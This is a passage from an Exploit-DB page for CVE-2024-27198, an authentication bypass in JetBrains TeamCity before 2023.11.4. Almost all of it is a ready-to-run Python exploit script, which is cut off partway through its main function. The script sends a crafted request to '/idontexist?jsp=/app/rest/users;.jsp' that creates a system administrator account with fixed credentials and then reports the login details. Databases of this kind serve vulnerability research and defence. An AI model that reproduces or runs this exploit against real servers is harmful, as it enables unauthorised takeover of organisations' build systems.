---
title: [webapps] JetBrains TeamCity 2023.11.4 - Authentication Bypass
url: https://www.exploit-db.com/exploits/52411
source: Exploit-DB.com RSS Feed
date: 2025-08-12
fetch_date: 2025-10-07T00:47:48.924019
---

# [webapps] JetBrains TeamCity 2023.11.4 - Authentication Bypass

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# JetBrains TeamCity 2023.11.4 - Authentication Bypass

#### EDB-ID:

###### 52411

#### CVE:

###### [2024-27198](https://nvd.nist.gov/vuln/detail/CVE-2024-27198)

---

**EDB Verified:**

#### Author:

###### [İbrahimsql](/?author=12279)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-11

---

**Vulnerable App:**

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
# Exploit Title: JetBrains TeamCity 2023.11.4 - Authentication Bypass
# Date: 2024-02-21
# Exploit Author: ibrahimsql (https://github.com/ibrahimsql)
# Vendor Homepage: https://www.jetbrains.com/teamcity/
# Version: < 2023.11.4
# CVE: CVE-2024-27198
# CVSS Score: 9.8 (Critical)
# Description:
# JetBrains TeamCity before version 2023.11.4 contains a critical authentication bypass
# vulnerability that allows unauthenticated attackers to perform administrative actions.
# The vulnerability leverages a path traversal-like technique in the JSP handling
# mechanism combined with REST API endpoints to bypass authentication.
# Requirements: requests>=2.25.1
"""

import requests
import argparse
import sys
import json
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

banner = f"""{Colors.CYAN}
 ████████╗███████╗ █████╗ ███╗   ███╗ ██████╗██╗████████╗██╗   ██╗
 ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║╚══██╔══╝╚██╗ ██╔╝
    ██║   █████╗  ███████║██╔████╔██║██║     ██║   ██║    ╚████╔╝
    ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║██║     ██║   ██║     ╚██╔╝
    ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╗██║   ██║      ██║
    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝╚═╝   ╚═╝      ╚═╝
{Colors.END}
{Colors.BOLD}{Colors.RED}    TeamCity Authentication Bypass (CVE-2024-27198){Colors.END}
{Colors.YELLOW}                Author: ibrahimsql{Colors.END}
"""

parser = argparse.ArgumentParser(description="TeamCity Authentication Bypass Exploit (CVE-2024-27198)")
parser.add_argument("--url", type=str, required=True, help="Target TeamCity URL")
parser.add_argument("--timeout", type=int, default=15, help="Request timeout (default: 15)")
parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose output")
args = parser.parse_args()

class TeamCityExploit:
    def __init__(self, target_url, timeout=15, verbose=False):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()

    def _log(self, message, level="info"):
        if level == "success":
            print(f"{Colors.GREEN}[+] {message}{Colors.END}")
        elif level == "error":
            print(f"{Colors.RED}[-] {message}{Colors.END}")
        elif level == "warning":
            print(f"{Colors.YELLOW}[!] {message}{Colors.END}")
        elif level == "info":
            print(f"{Colors.BLUE}[*] {message}{Colors.END}")
        elif level == "verbose" and self.verbose:
            print(f"[DEBUG] {message}")

    def check_target_reachability(self):
        try:
            self._log(f"Checking target: {self.target_url}")
            response = self.session.get(self.target_url, verify=False, timeout=self.timeout)

            if response.status_code in [200, 302, 401, 403]:
                self._log("Target is reachable", "success")
                return True
            else:
                self._log(f"Unexpected status: {response.status_code}", "error")
                return False

        except requests.exceptions.Timeout:
            self._log("Connection timeout", "error")
            return False
        except requests.exceptions.ConnectionError:
            self._log("Connection error", "error")
            return False
        except Exception as e:
            self._log(f"Error: {str(e)}", "error")
            return False

    def exploit_authentication_bypass(self):
        exploit_path = "/idontexist?jsp=/app/rest/users;.jsp"
        full_url = f"{self.target_url}{exploit_path}"

        self._log(f"Targeting: {full_url}")

        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*"
        }

        payload = {
            "username": "ibrahimsql",
            "password": "ibrahimsql",
            "email": "ibrahimsql@exploit.local",
            "roles": {
                "role": [{
                    "roleId": "SYSTEM_ADMIN",
                    "scope": "g"
                }]
            }
        }

        self._log(f"Payload: {json.dumps(payload)}", "verbose")

        try:
            self._log("Attempting authentication bypass...")

            response = self.session.post(full_url, headers=headers, verify=False, json=payload, timeout=self.timeout)

            self._log(f"Status: {response.status_code}", "verbose")
            self._log(f"Response: {response.text[:200]}", "verbose")

            if response.status_code == 200:
                self._log("Exploit successful!", "success")

                print(f"\n{Colors.BOLD}{Colors.GREEN}[SUCCESS] Admin user created!{Colors.END}")
                print(f"{Colors.CYAN}{'='*50}{Colors.END}")
                print(f"{Colors.YELLOW}Username:{Colors.END} ibrahimsql")
                print(f"{Colors.YELLOW}Password:{Colors.END} ibrahimsql")
                print(f"{Colors.YELLOW}Login URL:{Colors.END} {self.target_url}/login.html")
                print(f"{Colors.CYAN}{'='*50}{Colors.END}")

                return True

            elif response.status_code == 401:
                self._log("Authentication required - target may be patched", "error")
                return False
            elif response.status_code == 404:
                self._log("Endpoint not found - target may be patched", "error")
                return False
            elif response.status_code == 403:
                self._log("Access forbidden", "error")
                return False
            else:
                self._log(f"Unexpected status: {response.status_code}", "error")
                return False

        except requests.exceptions.Timeout:
            self._log("Request timeout", "error")
            return False
        except requests.exceptions.ConnectionError:
            self._log("Connection error", "error")
            return False
        except Exception as e:
            self._log(f"Error: {str(e)}", "error")
            return False

def validate_url(url):
    try:
        parsed = urlparse(url)
        if not parsed.scheme:
            url = f"http://{url}"
            parsed = urlparse(url)

        if parsed.scheme not in ['http', 'https']:
            raise ValueError("URL must use HTTP or HTTPS")

        if not parsed.netloc:
            raise ValueError("Invalid URL format")

        return url
    except Exception as e:
        raise ValueError(f"Invalid URL: {str(e)}")

def main():
    print(banner)

    try:
        target_url = validate_url(args.url)

        print(f"{Colors.BOLD}{Colors.CYAN}=== CVE-2024-27198 TeamCity Exploit ==={Colors.END}")
        print(f"{Colors.YELLOW}Author:{Colors.END} ibrahimsql")
        print(f"{Colors.YELLOW}Target:{Colors.END} {target_...